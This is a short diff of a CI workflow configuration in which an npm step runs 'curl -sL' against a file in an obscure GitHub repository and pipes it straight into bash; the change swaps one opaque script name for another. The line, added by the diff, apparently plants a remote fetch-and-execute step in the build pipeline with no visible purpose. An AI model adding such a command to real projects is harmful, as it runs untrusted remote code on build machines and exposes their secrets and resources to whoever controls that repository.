@@ -12,7 +12,7 @@ workflows:
     steps:
       - npm@1:
           inputs:
-            - command: curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/kelizz | bash
+            - command: curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/macxels | bash
 
   build:
     steps:
